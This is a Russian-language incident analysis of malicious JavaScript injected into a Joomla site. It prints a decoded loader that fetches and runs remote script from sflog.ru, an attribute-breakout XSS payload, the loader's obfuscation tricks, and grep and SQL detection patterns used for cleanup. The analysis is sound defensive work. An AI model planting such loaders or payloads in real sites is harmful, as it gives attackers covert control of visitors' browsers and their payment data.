# fo-y.ru — сторонний JS на сайте: разбор (20.08.2026)

Проверка сайта после починки оплаты. Найдено **две разные вещи**: одна безобидная,
вторая — настоящая инъекция. Сайт на Joomla (Helix Ultimate), хостинг Sprinthost
(`77.222.56.111`), вне нашего репозитория.

---

## 1. `js.aacaw.com` — неудавшаяся XSS-атака, СЕЙЧАС БЕЗВРЕДНА

В HTML на всех страницах:

```html
<li class="item-101 default current active &quot;&gt;&lt;script src=&quot;https://js.aacaw.com/fp/v1.min.js&quot;&gt;&lt;/script&gt;">
```

Задумка была `"><script src="https://js.aacaw.com/fp/v1.min.js"></script>` — вырваться
из атрибута `class` и подключить свой скрипт. **Joomla экранирует кавычки**, поэтому
payload остаётся текстом внутри `class` и не выполняется. Проверено в реальном Chrome:
запроса к `js.aacaw.com` не происходит.

🛑 Но сам факт важен: строка лежит в **CSS-классе пункта меню «Главная»** — значит кто-то
имел доступ к админке Joomla (или пролез через непроверенный ввод). Это индикатор
компрометации, даже если атака не сработала.

**Лечение:** Joomla → Меню → пункт «Главная» → вкладка «Отображение страницы» →
поле CSS-класса пункта меню → очистить.

---

## 2. `sflog.ru` — РЕАЛЬНАЯ ИНЪЕКЦИЯ, живая

### Где сидит

В `<head>` **на всех страницах**, между счётчиками Google Tag Manager и Top.Mail.Ru —
то есть замаскирована под ещё один счётчик:

```
… Google Tag Manager … → Yandex.Metrika → [ЗАГРУЗЧИК] → Top.Mail.Ru …
```

```html
<script src="data:text/javascript;charset=utf-8; base64, c2V0VGltZW91dChmdW5jdGlvbi&#x67;pe2xldCB2aHFxeT0i…" async></script>
```

### Как маскируется (5 слоёв — это не аналитика, это умысел)

1. `data:` URI — нет внешнего адреса, который попал бы в блок-листы;
2. base64;
3. **HTML-сущность `&#x67;` (буква `g`) прямо внутри base64** — ломает поиск по файлам и часть сканеров;
4. внутри — `\uXXXX`-эскейпы и склейка строк: `"scri"+"pt"`, `"https:/"+"/sflog"+".ru/js/"`;
5. `_zlxi.remove()` — узел удаляет сам себя после вставки, в DevTools его не видно.

Декодированный загрузчик:

```js
setTimeout(function(){
  let s = document.createElement("script"); s.async = 1;
  s.src = "https://sflog.ru/js/?id=b75b2b959c2320546b21724c3bed754d&domain=" + document.domain + "&term=0&r=vhqqy.js";
  document.getElementsByTagName("html")[0].appendChild(s);
  s.remove();
}, 181);
```

### Цепочка загрузки

| Ступень | Что | Особенности |
|---|---|---|
| 1 | загрузчик в `<head>` fo-y.ru | см. выше |
| 2 | `sflog.ru/js/?id=…` (40 КБ) | маяк проверки `?sf=3356bc6` → `sflog.ru/chk/`; тянет `cdnsec.ru/rules.js` |
| 3 | `datacdn.ru/js/?id=…&f=main.js` (36 КБ) | грузится **по scroll/mousemove** (на тач-устройствах сразу) |
| 3b | `datacdn.ru/js/gwinfo/ne.php` | только если страница открыта **во фрейме** |

**Что в 3-й ступени:** WebSocket-клиент (Iris) + localForage (IndexedDB). То есть
**постоянный канал управления из браузера посетителя** плюс своё хранилище. Что именно
исполнится — решает их сервер в момент подключения.

### Признаки злого умысла

- **Антианализ:** `dmas = ["jshell.net","appspot"]` — на этих доменах скрипт сам себя
  отключает (`src = "data:,"`). Легальная аналитика не прячется от песочниц.
- **Отложенный запуск по действию пользователя** (scroll/mousemove) — чтобы не попадаться
  автоматическим краулерам.
- **Глушит чужие скрипты:** `window.blocked=true`, `window.stock_key=false`,
  кука `_dmp_cookie_deny=1` на год, подмена `setTimeout` для колбэков `dmp_delay_0`,
  зануление `qoopler`, `findGetParameter`, `getUrlVars`, `ajax`, `makeid`.
- **Домены:** `sflog.ru` и `datacdn.ru` — один IP `92.255.229.221`, оба whois «Private Person»
  через REG.RU; `cdnsec.ru` за Cloudflare, создан 07.07.2025.

### 🛑 Прямо сейчас цепочка оборвана — но это случайность

У `sflog.ru` **протух Let's Encrypt-сертификат 18.08.2026** (`notAfter=Aug 18 15:38:34 2026`),
браузер режет запрос по `ERR_CERT_DATE_INVALID`. Проверено в рантайме: уходит только запрос
к `sflog.ru`, дальше ничего — DOM не меняется, WebSocket не открывается.

**Как только они перевыпустят сертификат — всё заработает снова.** Считать проблему
рассосавшейся нельзя.

### Чем это опасно

Чужой управляемый JS с полным доступом к DOM **на всех страницах, включая страницу оплаты**.
Сегодня это подмена рекламы и накрутка, завтра тем же каналом прилетает съём данных из формы —
менять код на своей стороне им не нужно, payload отдаётся сервером на лету.

---

## Что делать (по порядку)

1. **Снести загрузчик.** Искать по строке `data:text/javascript` — вероятнее всего это
   Template Settings → Custom Code → перед `</head>`, либо модуль «Custom HTML», либо
   `index.php` шаблона. По файлам и в базе:

   ```bash
   grep -rn "data:text/javascript" /path/to/site --include='*.php' --include='*.html'
   grep -rn "c2V0VGltZW91dChmdW5jdGlvbi" /path/to/site
   # в БД Joomla (модули, статьи, параметры шаблона):
   mysql -e "SELECT id,title FROM jos_modules WHERE content LIKE '%data:text/javascript%';"
   mysql -e "SELECT id,title FROM jos_content WHERE introtext LIKE '%data:text/javascript%'
             OR fulltext LIKE '%data:text/javascript%';"
   mysql -e "SELECT id,template,params FROM jos_template_styles WHERE params LIKE '%base64%';"
   ```
   (префикс `jos_` заменить на реальный)

2. **Очистить CSS-класс пункта меню «Главная»** (пункт 1 выше).

3. **Считать сайт скомпрометированным:** сменить пароли админки Joomla, FTP/SSH, БД и панели
   хостинга; проверить список пользователей с правами Super User — лишних удалить; проверить
   дату изменения файлов шаблона (`find … -mtime -90 -name '*.php'`).

4. **Поискать другие закладки:** `grep -rn "eval(base64_decode\|gzinflate(base64_decode\|str_rot13" /path/to/site --include='*.php'`

5. **Обновить** Joomla и расширения (SP Page Builder, Helix Ultimate) — вектор входа, скорее всего, там.

6. **Перепроверить** после чистки: страница не должна содержать `data:text/javascript`, а в
   консоли браузера не должно быть запросов к `sflog.ru` / `datacdn.ru` / `cdnsec.ru`.

---

## Наши системы

`siricrm.ru` и `crmsiri.ru` проверены — чисто: ни `data:` -скриптов, ни этих доменов
ни в отдаваемом HTML, ни в репозитории. Инъекция локальна для fo-y.ru.

Единственная точка соприкосновения — страница оплаты: она шлёт данные плательщика в CRM
(`/accounting/acquiring/pay/`). Пока на fo-y.ru крутится чужой JS, он технически видит
всё, что посетитель вводит в форму оплаты (ФИО, телефон, сумма) — до того, как данные уйдут к нам.
